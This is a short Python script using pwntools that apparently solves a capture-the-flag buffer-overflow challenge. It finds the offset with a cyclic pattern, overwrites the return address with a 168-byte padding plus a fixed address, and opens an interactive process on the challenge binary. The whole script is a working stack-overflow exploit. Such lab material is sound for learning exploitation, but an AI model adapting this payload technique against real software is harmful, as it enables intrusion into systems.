import pwn

""" Uncomment this to get cyclic value """
# pwn.context.terminal = ['tmux', 'splitw', '-h']

# proc = pwn.gdb.debug(["/challenge/finalctf_BasicOverflow", pwn.cyclic(9999)])
# # proc.send(pwn.cyclic(9999))
# proc.wait()
""""""

CYCLIC_NUM = 168

pwn.context.terminal = ["tmux", "splitw", "-h"]

payload = b"A"*CYCLIC_NUM + b"S\x12@\x00"

proc = pwn.process(["/challenge/finalctf_BasicOverflow", payload])

proc.interactive()
proc.wait()
